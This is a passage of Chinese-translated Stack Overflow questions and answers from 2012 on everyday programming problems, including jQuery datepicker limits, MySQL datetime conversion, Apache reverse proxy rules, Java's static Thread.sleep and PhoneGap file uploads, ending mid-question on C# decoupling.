有关差异的解释，请参见[http://kangax.github.com/nfe/](http://kangax.github.com/nfe/)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T10:57:05.320

哦.......这只是为了好玩......

* * *

~~它们是相等的，但使用这种短路闭合方式代替：（Twitter 使用它！）~~

 ~~```
!function(){

}(); 
```~~ 

~~您将保存许多字符。每次1。~~

* * *

但我更喜欢使用我认为它更具可读性的这个：

```
(function(){

})(); 
```

比：

```
(function(){

}()); 
```

# javascript - Highcharts 折线图工具提示未正确显示？

> ID：10514648
> 
> 赞同：4
> 
> 时间：2012-05-09T10:55:17.590
> 
> 标签：javascript, highcharts

我正在尝试创建一个简单的折线图，但工具提示发生了一些奇怪的事情。似乎只有第一点和最后一点显示工具提示数据，由于某种原因，它似乎无法在两者之间选择任何东西。该图表相当简单，所以我不确定它可能是什么，除非它与日期时间轴有关？

我会很感激任何想法。

[http://jsfiddle.net/kJ47n/](http://jsfiddle.net/kJ47n/)

编辑：这是一个更简单的版本 [http://jsfiddle.net/kJ47n/1/](http://jsfiddle.net/kJ47n/1/)

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-09T11:54:20.410

我想问题是您的 X 值未排序，我按 X 值对数组进行了排序并且工作正常，看：

[http://jsfiddle.net/9H6h2/](http://jsfiddle.net/9H6h2/)

或者你的数据数组是错误的，这样的事情对我来说更有意义：

```
var ldlData = [[100,1336535631000], [110, 1304913231000], [120, 1273377231000], [130, 1241841231000], [140, 1210305231000], [150, 1178682831000]]; 
```

希望能帮助到你！

# jquery - jquery datepicker验证

> ID：10514660
> 
> 赞同：0
> 
> 时间：2012-05-09T10:56:16.283
> 
> 标签：jquery, validation, datepicker

如何限制用户输入未来日期？

这是视图：

```
@Html.TextBoxFor(a => a.ARRIVING_DT,new { @class="date"})

$(".date").datepicker({   
    changeMonth: true,   
     changeYear: true,   
     dateFormat: 'dd/mm/yy' ,
     selectOtherMonths: true,
        showOtherMonths: true,
        showStatus: true,
        showButtonPanel: true,
        showOn: 'button',
        buttonImage: '../../Content/themes/base/images/i_cal.gif',
        buttonImageOnly: true,
        buttonText: 'Choose a Date'
          }); 
```

我正在尝试为此编写 valdation 属性：

```
 [Required(ErrorMessage = "Enter Date of Departure")]
    public object DEPARTURE_DT { get; set; } 
```

还需要写什么？Range 属性也不起作用。感谢您提供任何帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T10:58:56.703

要禁用未来日期，请添加：

```
maxDate: new Date, 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-10T13:45:39.643

```
$('#<%= txtDate.ClientID  %>').datepicker({
                 maxDate: new Date(currentYear, currentMonth, currentDate)
             });
This will disable the future dates from getting entered. another best way for the question. 
```

# dotcover - Dotcover 和 Lighthouse 不生成报告数据

> ID：10514662
> 
> 赞同：0
> 
> 时间：2012-05-09T10:56:24.477
> 
> 标签：dotcover, lighthouse

我正在尝试使用 dotCover 和 lighthouse 生成测试覆盖率报告。dotcover cover 命令会创建一个 15Mb 的 .dcvr 文件，但在该文件上运行 dotcover report 会产生空结果：

```
<?xml version="1.0" encoding="utf-8"?>
<Root Name="Root" CoveredStatements="0" TotalStatements="0" CoveragePercent="0" ReportType="XML" DotCoverVersion="2.0.407.25" /> 
```

我已经成功地为非 silverlight 代码单元 nunit 测试运行程序生成了报告，所以我知道可能会绕过 dotCover。

有人知道使用这种工具组合有什么问题吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-24T14:52:17.360

目前 dotCover 不为 Silverlight 测试提供命令行覆盖支持。感谢您提供信息，我们将进一步调查此问题。

问题是拍摄了测试启动器的快照而不是进程快照，并且没有启动器 PDB 的事实可能会导致空结果。

# soap - 经典 ASP 将对象属性传递给 SOAP

> ID：10514664
> 
> 赞同：0
> 
> 时间：2012-05-09T10:56:28.377
> 
> 标签：soap, asp-classic

我们有一个 Java Web 服务 (WSDL) 和一个 ASP 客户端。我们正在使用 SOAP Toolkit 3.0 来调用 Java Web 服务。Java Web 服务正在公开对象，因此我需要使用复杂的类型映射器。

当我尝试这个时，我得到了错误 -

```
SoapMapper:Saving SoapMapper account failed HRESULT=0x80004002: No such interface supported - Client:Unspecified client error. HRESULT=0x80004002: No such interface supported 
```

代码是：

```
On Error Resume Next

Dim objWebSvcClient
Dim  strSuccess
Dim myaccount

set objWebSvcClient = server.CreateObject("MSSOAP.SoapClient30")
objWebSvcClient.ClientProperty("ServerHTTPRequest") = True
objWebSvcClient.MSSoapInit ("c:\TestAsp.wsdl")

class Account
    Dim maccid 'As String
    Dim maccName 'As String

    Public Property Get accId() 'As String
        accId = maccid
    End Property

    Public Property Let accId(ByVal Value )
        maccid = Value
    End Property

    Public Property Get accName() 'As String
        accName = maccName
    End Property

    Public Property Let accName(ByVal Value )
        maccName = Value
    End Property
End class

Set myaccount = new Account
myaccount.accId = "ABC"
myaccount.accName = "ABC"

strSuccess = objWebSvcClient.setAccount(myaccount) 
```

如果我遗漏了一些信息，请告诉我。

参考一些执行相同实现的示例也会有所帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T11:15:03.767

该语句`objWebSvcClient.MSSoapInit ("c:\TestAsp.wsdl")`将物理文件设置为 URL。您可以通过这种方式解析 WSDL，但 wsdl 本身中给出的 URL 可能无法正常工作，或者相对路径会失败。

尝试为 wsdl 文件提供完整的 http url。

# iphone - iOS：如果应用程序未在后台运行，则在启动时调用 openURL 会使应用程序崩溃

> ID：10514668
> 
> 赞同：3
> 
> 时间：2012-05-09T10:56:35.553
> 
> 标签：iphone, objective-c, ios

我正在尝试从外部 url（使用链接从电子邮件/网页`myapp://sale/1234`）将我的应用程序启动到特定视图。

如果应用程序尚未在后台运行，则应用程序在启动时崩溃。

如果应用程序在后台运行，`application:openURL:sourceApplication:annotation:`则完美调用。

请帮帮我。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2016-03-17T08:17:12.080

我使用以下代码修复了

```
if([[UIApplication sharedApplication] canOpenURL:url]){            
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            [[UIApplication sharedApplication] openURL:url];
        });
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T09:19:36.087

我的错伙计们，它是 coredata manageObjectContext，它不是在调用 openUrl 时创建的。如果未创建上下文，我将保存 url，并在创建 managedObjectContext 后调用 openUrl。OpenUrls 与我的崩溃无关。它总是工作得很好......无论如何，非常感谢。

# iphone - UITableview Xcode 问题中的 UISearch

> ID：10514673
> 
> 赞同：-2
> 
> 时间：2012-05-09T10:56:49.293
> 
> 标签：iphone, uisearchbar

> **可能重复：**
> [Xcode iPhone 中的搜索栏](https://stackoverflow.com/questions/10510131/search-bar-in-xcode-iphone)

我正在 Iphone 应用程序中处理 UISearchBar。我正在寻找一个简单的应用程序来过滤联系人列表。任何人都可以在这个问题上指导我。我在屏幕顶部有一个搜索栏。我需要一个代码来实现联系人列表中的搜索。

请在这个问题上指导我。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T11:10:38.480

```
- (void)filterContentForSearchText:(NSString*)searchText scope:(NSString*)scope
{
    // Update the filtered array based on the search text and scope.
    [self.filteredListContent removeAllObjects]; // First clear the filtered array.

    //mode==1 means search mode.  mode==0 means normal mode.
    if (![searchText isEqualToString:@""]) {
        mode=1;
    }

    for (id arrayObject  in listContent)
    {
        NSString *objectInfo=[arrayObject getDescription];
        NSRange result=[objectInfo rangeOfString:searchText options:NSCaseInsensitiveSearch];
        if (result.location >= 0 && result.location<=[objectInfo length])
        {
            [self.filteredListContent addObject:arrayObject];
        }
    }
} 
```

# mysql - 在mysql数据库中搜索-未序列化的数据

> ID：10514679
> 
> 赞同：0
> 
> 时间：2012-05-09T10:57:05.503
> 
> 标签：mysql, ruby-on-rails, ruby, serialization, deserialization

情况：我有用户模型。db 中的属性“meta_data”表示“文本”类型字段。在模型中，它由自定义类序列化。( `serialize :meta_data, CustomJsonSerializer.new`)

这意味着，当我有一个用户实例时，我可以`meta_data`使用 Hash。

```
User.first.meta_data['username'] 
```

问题：

我需要编写一个搜索函数，它将通过给定的字符串搜索用户。我可以通过在 rails ex 中手动构建搜索查询来做到这一点。`User.where("email LIKE '%#{string}%'")...` 但是 meta_data 呢？我也应该通过 LIKE 语句在此字段中搜索吗？如果我这样做，它将降低找到记录的相关性。

例如：

我有 2 个用户。其中一个有用户名“patrick”，另一个是“sergio”

db 中的元数据如下所示：

1）{用户名：帕特里克}

2）{用户名：塞尔吉奥}

我想找到 sergio ，我输入了一个搜索字符串 "ser" => 但我有 2 个结果，而不是一个。这个 meta_data 字符串“{uSERname: Patrick}”也有“ser”，所以它使这条记录无关紧要。

你知道如何解决它吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T11:10:45.377

这确实是序列化数据的问题。理论上，序列化可能是一种非常难以搜索的算法。它可以进行霍夫曼编码或其他压缩，并以二进制形式存储序列化。您依赖于序列化使用 JSON 并且您的字符串仍然可以作为序列化中的子字符串找到的假设。

那么你遇到的问题是另一个问题。序列化中的其他数据可能会弄乱您的结果。

一般来说，如果您对数据进行序列化，您就是在选择不可搜索。

因此，一种解决方案是添加一个您以您控制的方式填充的附加字段。有一个值字段并存储您可以搜索的竖线 (|) 分隔值。因此，如果数据是 {firstname: "Patrick", lastname: "Stern"}，您的 meta_values 字段可能是“Patrick|Stern”。

此外，不要将 where 方法与带有 #{} 扩展输入值的字符串一起使用。这使得它容易受到 SQL 攻击。而是使用：

```
where("meta_values is like :pattern", pattern: "%#{string}%") 
```

我知道这看起来可能没什么不同，但 ActiveRecord 会以这种方式进行清理。如果有人在字符串中有分号，那么 ActiveRecord 将在搜索条件中转义分号。

# mysql - 在mysql中减去2个日期时间（一个24小时格式，一个上午/下午格式）

> ID：10514685
> 
> 赞同：1
> 
> 时间：2012-05-09T10:57:17.400
> 
> 标签：mysql, datetime

我正在尝试使用 mysql 创建一个查询。

```
select ID,NCOde,ifnull(EndTime,now())-starttime from xxx where starttime between 
'2012-05-09 00:00:00' and '2012-05-09 23:59:59' 
```

问题是 ifnull(EndTime,now()) 以 24 小时格式返回日期时间，而开始时间使用 am/pm 格式。

我尝试过使用`DATE_FORMAT(starttime, '%m-%d-%Y %T')`，但似乎该操作将日期时间类型更改为其他类型。

有什么建议吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T11:17:45.007

用于[`STR_TO_DATE()`](http://dev.mysql.com/doc/en/date-and-time-functions.html#function_str-to-date)将您的`starttime`字符串转换为 MySQL `DATETIME`：

```
STR_TO_DATE(starttime, '%m-%d-%Y %r') 
```

然后使用[`TIMEDIFF()`](http://dev.mysql.com/doc/en/date-and-time-functions.html#function_timediff)减去两次：

```
select ID,NCOde,
  TIMEDIFF(ifnull(EndTime,now()), STR_TO_DATE(starttime, '%m-%d-%Y %r'))
from xxx
where STR_TO_DATE(starttime,'%m-%d-%Y %r')
        between '2012-05-09 00:00:00' and '2012-05-09 23:59:59' 
```

您可能应该考虑将`starttime`列的数据类型更改为[`DATETIME`](http://dev.mysql.com/doc/en/datetime.html)或[`TIMESTAMP`](http://dev.mysql.com/doc/en/datetime.html)。另请注意，这假设`EndTime`已经是这种数据类型，否则您也必须对其执行类似的转换。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T11:20:53.040

使用[DATE_SUB()](http://dev.mysql.com/doc/refman/5.1/en/date-and-time-functions.html#function_date-sub)函数。

加上eggyal所说的。

# javascript - 带有 WebSql 结果集的 Jquery.tmpl

> ID：10514687
> 
> 赞同：0
> 
> 时间：2012-05-09T10:57:23.007
> 
> 标签：javascript, jquery, html, jquery-mobile, web-sql

我正在使用并从数据库`JQM`中构建大量联系人。`webSQL`目前这个过程非常缓慢，所以我正在尝试使用模板来查看这如何影响性能。

我无法弄清楚如何将`Jquery`模板与 WebSQL ResulSet 一起使用。

这是到目前为止的代码：

```
function (tx, result)
{
    var markup = '<li><a href="#contact">${result.Name}</a></li>';
    $.template("contactTemplate", markup);
    $.tmpl("contactTemplate", /* What goes here? */).appendTo($list);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T11:27:09.077

好的，Jquery 模板需要一个数组。因此，以下工作：

```
var contacts = [];

for (i = 0; i < result.rows.length; i++)
{
    contacts.push(result.rows.item(i));
}

var markup = '<li><a href="#contact">${Name}</a></li>';
$.template("contactTemplate", markup);

$.tmpl("contactTemplate", contacts).appendTo($list); 
```

这种方法对性能的影响很小。建立列表同样缓慢。

# iphone - iPhone 中的 ScoreLoop

> ID：10514688
> 
> 赞同：0
> 
> 时间：2012-05-09T10:57:25.030
> 
> 标签：iphone, objective-c, scoreloop

目前我正在为 iPhone 开发社交游戏。我想在这个游戏中集成[ScoreLoop 。](http://www.scoreloop.com/)如果有人知道使用 scoreloop。请告诉我如何使用这个？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T12:44:56.640

检查您的 Scoreloop SDK 文件夹（您下载的文件夹），会有一个**文档**文件夹，您可以在其中导航到 ScoreloopCSE 文档**PDF 文件**，其中列出了将 Scoreloop 集成到您的应用程序中的所有步骤。

请参阅此链接。我从这个链接的答案中了解了如何实现它：

[781 无法在 cocos2d iphone 中集成 scoreloop](http://support.scoreloop.com/discussions/problems/781-can-not-integrate-scoreloop-in-cocos2d-iphone)

希望这对您有所帮助。

# mod-rewrite - 反向代理只是主页

> ID：10514689
> 
> 赞同：0
> 
> 时间：2012-05-09T10:57:25.373
> 
> 标签：mod-rewrite, url-rewriting, reverse-proxy

我正在尝试仅反向代理网站上的主页 - 尝试使用以下规则。基本上我有一个备用页面，我希望内容来自服务器，但我仍然希望站点的原始 URL 与来自反向代理的内容一起显示。两个页面都在同一个域中 - 唯一的区别是一个是 www.domain.com 而另一个页面是 www2.domain.com

```
RewriteCond %{HTTP_HOST} ^www\.domain\.com$ [NC]
ProxyPass http://www.domain.com http://www2.domain.com/
ProxyPassReverse http://www.domain.com  http://www2.domain.com/ 
```

当我在上面设置规则时它不起作用 - 有人可以告诉我我哪里出错了吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-10T08:21:33.133

[ProxyPass](http://httpd.apache.org/docs/2.0/mod/mod_proxy.html#proxypass)和[ProxyPassReverse](http://httpd.apache.org/docs/2.0/mod/mod_proxy.html#proxypassreverse)的第一个参数是路径，您的指令的正确语法是

```
ProxyPass / http://www2.domain.com/
ProxyPassReverse /  http://www2.domain.com/ 
```

但这将代理您的所有请求。尝试

```
#disable forward requests
ProxyRequests Off

#allow proxy requests
<Proxy *>
    Order deny,allow
    Allow from all
</Proxy>

#reverse proxy 
RewriteEngine On
RewriteRule    ^/?$   http://www2.domain.com/ [P,QSA,L] 
```

如果代理失败，您的服务器 error.log 可能会告诉您发生了什么。或者为mod_rewrite添加一个日志，它会告诉你为什么它没有捕获请求

```
RewriteLogLevel 5
RewriteLog /path/to/a/file 
```

# java - Java 示例：这真的是以非静态方式访问静态方法吗？

> ID：10514691
> 
> 赞同：0
> 
> 时间：2012-05-09T10:57:32.300
> 
> 标签：java

我只是从我的课本中研究一些例子，在 Eclipse 中编写代码来解决它。

这是我有疑问的方法的代码：

```
public void run() {
    //Get the lock before entering the loop
    synchronized(getClass()) {
        for (int i =0; i<N; i++) {
            System.out.println(getName() + " is tired");

            try{
                Thread.currentThread().sleep(DELAY);
            } catch (InterruptedException e) {}

            System.out.println(getName() + " is rested");
        } 
```

在线与：

```
Thread.currentThread().sleep(DELAY) 
```

Eclipse 发出警告：“应以静态方式访问类型 Thread 的静态方法 sleep(long)”。Eclipse 建议以下解决方案：

```
Thread.currentThread();
Thread.sleep(DELAY); 
```

我不明白为什么它会有所作为（如果确实如此的话）。有人可以解释一下吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-09T11:00:38.657

[`sleep()`](http://docs.oracle.com/javase/6/docs/api/java/lang/Thread.html#sleep%28long%29)是一个静态方法并导致*当前线程*休眠指定的时间量。因此该`currentThread()`调用是多余的，并且可能会造成混淆，因为它几乎暗示您可以使用类似的代码使*另一个线程*休眠（您不能）。

编写该代码的最佳方法很简单：

```
Thread.sleep(DELAY); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-09T11:01:55.563

有问题的代码与线程无关。Eclipse 只是说您应该`sleep`直接通过类名访问静态方法，而不是通过 instanse: `Thread.sleep(DELAY)`。

为了清晰（和简洁），应该访问`static ... f()`类的任何静态方法。`C``C.f()`

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-09T11:01:54.753

Thread.sleep() 已经是一个静态方法并影响当前线程。无需调用 currentThread()。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-09T11:03:46.953

Thread.delay 是一个静态方法。它不需要实例来调用它——你可以说 Thread.delay()。

Thread.currentThread() 返回一个对当前线程的引用。您可以在其上调用静态方法，但您并不严格需要该引用，并且根本不使用它。你同样可以这样做：

```
new Thread().delay(100); 
```

...它仍然会使当前线程休眠 - 而不是我们刚刚创建的线程。

所以 Eclipse 告诉你更好、更容易混淆的方法是 Thread.delay(100)。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-05-09T11:15:06.180

如果我错了，请纠正我，但警告可能是“静态方法......应该以**静态方式**访问”（不是......应该以**非静态方式**访问）。

事实上，它是令人困惑的调用

```
someThread.sleep(1000) 
```

因为 Thread.sleep() 是一个静态方法，它不被称为“反对” someThread，而是在当前线程上。

所以消息说“以静态方式访问静态方法”:)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-05-09T11:00:53.590

它在执行上没有任何区别。然而，第二个选项 Thread.sleep() 更具可读性，因为用户不会因为认为它是一个实例方法而感到困惑。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-05-09T11:02:39.873

通过访问该方法，因为`Thread.currentThread().sleep()`它给人的印象是它是一个实例方法，为了避免混淆，Eclipse 建议您通过所有者类访问静态方法，这样可以清楚地表明它们实际上是静态的。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2014-02-14T01:32:23.240

正如 Victor Sorokin 所写，警告与带有线程的示例代码无关。这是另一个示例，在 Eclipse 中，我们会收到相同的编译器警告：

```
OptionBuilder.withArgName(PROPERTY_ARG).hasArg(true).isRequired(false).create(PROPERTY_ARG_OPTION); 
```

这是使用 Apache Commons CLI 库。OptionBuilder 使用“流利的”构建器模式。我看到修复警告的唯一方法是使用推荐的 Eclipse 提示，将行分成多个语句，或者添加注释以忽略警告。

* * *

## 回答 #9

> 赞同：-1
> 
> 时间：2017-01-11T11:32:07.180

```
Thread currentThread = Thread.currentThread();
currentThread.wait(DELAY); 
```

# objective-c - 无法从服务中读取 JSON

> ID：10514694
> 
> 赞同：3
> 
> 时间：2012-05-09T10:57:43.353
> 
> 标签：objective-c, ios, json, nsdictionary, nsdata

我正在实施忘记密码服务，在该服务中我将传递一个电子邮件地址，它会返回 JSON 以确认已发送的电子邮件。问题是我无法读取 json 中的响应字符串，并且我的异常消息显示 data 参数为 nil，但是如果我在 Web 浏览器中查看 url，则服务看起来很好，如下所述。我的代码是：

```
NSURL *url = [LokalmotionCommonTask getURLForgotPassword:emailFieldTxt.text];

    NSData* data = [NSData dataWithContentsOfURL: url];

    @try {
        NSError* error;
        NSDictionary* jsonDict = [NSJSONSerialization 
                                  JSONObjectWithData:data //1
                                  options:0 
                                  error:&error];

        NSLog(@"%@", [jsonDict objectForKey:@"response"]);
    }
    @catch (NSException *exception) {
        NSLog(@"forgot password exception: %@: %@", [exception name], [exception reason]);
    } 
```

我在网络浏览器中得到的服务响应是这样的：

```
{"status":400,"response":"Your request to change password is already sent. Please check your email."} 
```

例外：

```
forgot password exception: NSInvalidArgumentException: data parameter is nil 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-09T11:10:49.233

在 Objective-C 中，异常仅用于致命错误，而不是可恢复的错误。相反，只需检查 nil 数据：

如果您需要知道失败的原因是什么，请使用：

```
NSError* error;
NSURL *url = [LokalmotionCommonTask getURLForgotPassword:emailFieldTxt.text];
NSData* data = [NSData dataWithContentsOfURL: url options:NULL error:&error];
if (data) {
    NSDictionary* jsonDict = [NSJSONSerialization 
                              JSONObjectWithData:data //1
                              options:0 
                              error:&error];
    NSLog(@"%@", [jsonDict objectForKey:@"response"]);
}
else {
    NSLog(@"forgot password error, %@", [error localizedFailureReason]);
} 
```

存在命名约定错误：`getURLForgotPassword:`
以“get”开头的方法名称暗示将有一个按引用返回的参数。最好只命名方法：`forgotPasswordURL:`

以 get 为前缀的异常和访问器这两件事是与 Jave 的基本区别。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-09T11:40:06.543

有错误说`data parameter is nil`。因此，您为 JSON-date 传递的变量可能是`nil`.
`[NSData dataWithContentsOfURL:url]`由于发生错误，可能返回 nil。尝试记录。

此外，即使它只是您请求的一个小文件，我也会进行异步请求，以免阻塞 UI。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-03-11T10:16:28.473

我遇到了同样的问题，问题是我在 url 字符串中给出了额外的空间，即 url 字符串 @"http:...." 通过删除 url 字符串开头的空格来纠正它@"https:... 。”

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-04T05:01:38.917

通过修复服务 URL 解决了我的 url 未编码并且内联空格

# java - 如何自定义 Sonar 从 pom.xml 生成的 PMD 配置文件？

> ID：10514699
> 
> 赞同：1
> 
> 时间：2012-05-09T10:58:02.090
> 
> 标签：java, sonarqube, checkstyle

我想`protectedAllowed`在我的 pom.xml 中激活 checkStyle 选项。

我怎样才能做到这一点 ？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-10T16:17:37.457

配置 Sonar 生成的 PMD 文件的唯一方法是修改您正在使用的质量配置文件。为此，您必须登录 Web 管理控制台并转到“质量配置文件”部分（如果您使用默认配置文件，您可能需要创建自己的配置文件 - 这很简单，您只需复制它)

有关更多信息，请参阅[http://docs.codehaus.org/display/SONAR/Quality+profiles](http://docs.codehaus.org/display/SONAR/Quality+profiles)。

# java - 如何找出用户在Java Graphics中绘制的线条中的所有像素

> ID：10514700
> 
> 赞同：0
> 
> 时间：2012-05-09T10:58:03.343
> 
> 标签：java, graphics, line

我一直在尝试将用户绘制的一条线的所有像素放入一个数组中。

稍后我将尝试对这条线进行分析，因此不要错过任何像素是非常重要的。使用我目前使用的代码，它会丢失很多像素。问题应该在于图形创建线条而不是单个像素的方式。设置的像素被保存到`image1Pixel`数组中。这是我`myMouseDragPaint`将行保存到数组中的函数。有谁知道我可以如何改变它，这样我就不会错过任何像素？如果您需要有关此问题的任何其他信息，请随时提出。

谢谢，

米萨

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T11:17:43.340

您在代码中只保存线顶点，缺少它们之间的所有像素：

```
image1Pixel[currX][currY] = 1; // line vertex
G.drawLine(prevX, prevY, currX, currY); // this draws a whole line, no just two vertex points 
```

您需要：

*   插值该行上的所有像素。例如，流行的算法是[Bresenham 的](http://en.wikipedia.org/wiki/Bresenham%27s_line_algorithm)
*   或获取图像并直接从中读取像素颜色

另外，请注意线条不覆盖单个像素（完全垂直或水平像素除外）。所以第二个选项对你来说会更好，因为你不会在图形库之后重复绘制数学。

# iphone - Phonegap 文件传输在 iPhone 模拟器中工作但在设备上不工作

> ID：10514701
> 
> 赞同：1
> 
> 时间：2012-05-09T10:58:03.940
> 
> 标签：iphone, cordova

以下代码在我的 iPhone 模拟器中运行良好。我尝试使用 Cordova 1.6 使用 IOS 5.1，也尝试使用 1.7。我的外部主机条目配置为 127.0.0.1

这是代码：

```
 function uploadPhoto(imageElement){
               var options = new FileUploadOptions();
               var options = new FileUploadOptions();
               options.fileKey="file";
               options.mimeType="image/jpeg";
               options.fileName="carimage.jpg";
               options.chunkedMode = true;
               var params = new Object();
               params.value1 = "Car";
               params.value2 = "Used";

               options.params = params;
               options.chunkedMode = false;

               var ft = new FileTransfer();
               console.log("Upload Photo");
               ft.upload(
                         document.getElementById(imageElement).src,
                         "http://127.0.0.1:8080/claim/image",
                         win, 
                         fail,
                         options, 
                         true);
               console.log("Done Uploading");
           }

           function win(r) {
               console.log("Code = " + r.responseCode);
               console.log("Response = " + r.response);
               console.log("Sent = " + r.bytesSent);
           }

           function fail(error) {
               alert("An error has occurred: Code = " + error.code);
               console.log("upload error source " + error.source);
               console.log("upload error target " + error.target);
           } 
```

Xcode 中的模拟器输出为：

```
2012-05-09 12:45:09.390 motorazzi[24964:13403] Multi-tasking -> Device: YES, App: YES
2012-05-09 12:48:28.421 motorazzi[24964:13403] [INFO] Upload Photo
2012-05-09 12:48:28.484 motorazzi[24964:13403] [INFO] Done Uploading
2012-05-09 12:48:40.662 motorazzi[24964:13403] [INFO] Code = 200
2012-05-09 12:48:40.662 motorazzi[24964:13403] [INFO] Response = 
2012-05-09 12:48:40.663 motorazzi[24964:13403] [INFO] Sent = 1358 
```

这很好，但是使用 Xcode 中的设备，我得到：

```
2012-05-09 12:51:40.537 motorazzi[885:707] Multi-tasking -> Device: YES, App: YES
2012-05-09 12:51:56.554 motorazzi[885:707] [INFO] Upload Photo
2012-05-09 12:51:56.654 motorazzi[885:707] [INFO] Done Uploading
2012-05-09 12:51:56.748 motorazzi[885:707] File Transfer Error: Could not connect to the server.
2012-05-09 12:51:56.798 motorazzi[885:707] [INFO] An error has occurred: Code = 3
2012-05-09 12:51:56.803 motorazzi[885:707] [INFO] upload error source http://127.0.0.1:8080/claim/image
2012-05-09 12:51:56.813 motorazzi[885:707] [INFO] upload error target file:///var/mobile/Applications/699481A7-C598-43BA-BDCA-962DEF925EE5/tmp/photo_020.jpg 
```

在我的服务器日志中，我可以看到设备根本没有连接。有什么我可能做错或应该检查的地方吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T13:26:58.723

当您在设备上运行时，IP 地址 127.0.0.1 或“localhost”就是设备本身。这就是为什么你没有击中你的服务器。您必须输入托管上传脚本的服务器的主机名或 IP 地址。

此外，请确保将服务器列入您的 plist 中的白名单，否则它将被拒绝。

# java - Android ListView if 语句

> ID：10514702
> 
> 赞同：-1
> 
> 时间：2012-05-09T10:58:13.307
> 
> 标签：java, android, string, listview, if-statement

嗨，我有以下 ListView 代码：

```
 {
        // Populate the wordsList with the String values
        ArrayList<String> matches = data.getStringArrayListExtra(
                RecognizerIntent.EXTRA_RESULTS);
        wordsList.setAdapter(new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1,matches));
    } 
```

我想要一个监听器，当它从 wordsList 中找到字符串“start”时，它会执行一个 if 语句，我已经尝试了好几个小时但无法到达任何地方。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T11:02:52.960

你的意思是这样的吗？

```
myList.setOnItemClickListener(new OnItemClickListener() {
        @Override
  public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
      if (myList.getAdapter().getItem(position).equals("Start")) {
        //Do your stuff here
      }
  }
}); 
```

在这种情况下，当用户单击文本为“开始”的项目时，将调用侦听器。那是你要的吗？

# javascript - 为什么我不能在 IE8 (javascript) 上扩展 localStorage？

> ID：10514705
> 
> 赞同：3
> 
> 时间：2012-05-09T10:58:25.037
> 
> 标签：javascript, local-storage

我想向 localStorage 添加 2 个方法。我的目标是最终得到这样的结果：

```
localStorage.setObject(key, object);
localStorage.getObject(key); 
```

此解决方案适用于大多数浏览器，但不适用于 IE8：

```
Storage.prototype.setObject = function(key, value) {
    this[key] = JSON.stringify(value);
}

Storage.prototype.getObject = function(key) {
    return JSON.parse(this[key]);
} 
```

在做了一些研究之后，显然我可以使用 Lawnchair.js 或以其他方式解决它。但我想知道*为什么*它在 IE8 中不起作用。我可以扩展字符串和数组。为什么不存储？如何在 IE8 中找出哪些对象可以扩展，哪些对象不能扩展？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-09T11:26:04.160

这是**IE**。您也不能扩展 DOM 元素。如果你有时真的需要调用一个函数，你可以通过`Storage.prototype.getObject.call(localStorage, 'hello')`.

扩展内置对象也不被认为是一件好事。

# c# - 初学者需要的减少耦合简单示例

> ID：10514706
> 
> 赞同：7
> 
> 时间：2012-05-09T10:58:29.130
> 
> 标签：c#, decoupling, coupling, loose-coupling

刚从大学毕业，遇到了一些我需要减少耦合的代码。但我并不完全理解所有的概念，并且想要一个简单的例子来帮助我。为了让你开始，我有一个带有单个字段的人员类，名称。我在该类中有一个方法来连接一些文本。

我知道这是一个愚蠢的例子，大多数人永远不会考虑在如此简单的情况下减少耦合，但我只想要一个简单的例子来帮助我完全理解代码和概念。

在主窗口后面的代码中，我放置了一个文本框和一个按钮。当窗口加载时，它会显示人员 x 姓名字段的当前值。单击按钮时，将调用 x.PersonAddText 方法。目前，此示例的耦合计算为 8。按钮单击事件为 3，窗口加载事件为 3。

有什么办法吗，使用这个例子，我们可以将它们中的一个或两个都降低到低于这个值。

以下是我的所有代码：

我的个人类：

```
public class Person
{
    //Fields
    private string name;

    //Properties
    public string Name
    {
        get { return name; }
        set { name = value; }
    }

    //Constructors
    public Person()
    {
        name = "joe";
    }

    //Methods
    public string PersonAddText(string text)
    {
        return name += " - " + text;
    }

    //Interfaces (or additional code below here please to aid understanding)
} 
```

我的代码背后：

```
 Person x = new Person();

    public MainWindow()
    {
        InitializeComponent();
    }

    private void Window_Loaded(object sender, RoutedEventArgs e)
    {
        txtname.Text = x.Name;
    }

    private void button1_Click(object sender, RoutedEventArgs e)
    {
        txtname.Text = x.PersonAddText(txtname.Text);
        txtname.Text = x.Name;
    } 
```

我的简单 XAML：

```
<Grid>
